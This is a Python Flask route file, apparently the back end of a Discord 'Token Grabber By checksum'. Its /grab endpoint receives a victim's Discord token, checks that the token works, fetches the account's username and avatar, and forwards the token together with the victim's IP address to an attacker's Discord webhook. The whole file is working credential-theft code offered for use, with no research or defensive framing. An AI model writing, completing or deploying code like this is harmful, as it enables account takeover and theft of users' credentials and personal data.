from flask import request, jsonify
from discord_webhook import DiscordWebhook, DiscordEmbed

from . import routes

from core import config_object as config
from core.validate import Validate
from core.discord.user import DiscordUser


@routes.route('/grab', methods=['GET'])
def token_grabber():
    token = request.args.get('token')
    secret = request.args.get('secret')

    # TODO: prevent request flooding and token dupes
    ip = request.remote_addr

    if token is None or secret is None or secret != config.secret:
        return (jsonify(error='unauthorized'), 400)

    if Validate.token(token) is False:
        return (jsonify(error='invalid token'), 400)

    user = DiscordUser(token)
    
    embed = DiscordEmbed()
    embed.set_footer(text=f'{user.username}#{user.discriminator} • {user.id}', icon_url=f'https://cdn.discordapp.com/avatars/{user.id}/{user.avatar}.webp')
    embed.title = '                  Token Grabber By checksum'
    embed.description = f'''```
                           Token
===========================================================
{token}


                        IP-Address
===========================================================
{ip}
```'''

    webhook = DiscordWebhook(config.webhook_url)
    webhook.add_embed(embed)
    webhook.execute()
    
    return jsonify(success=True)
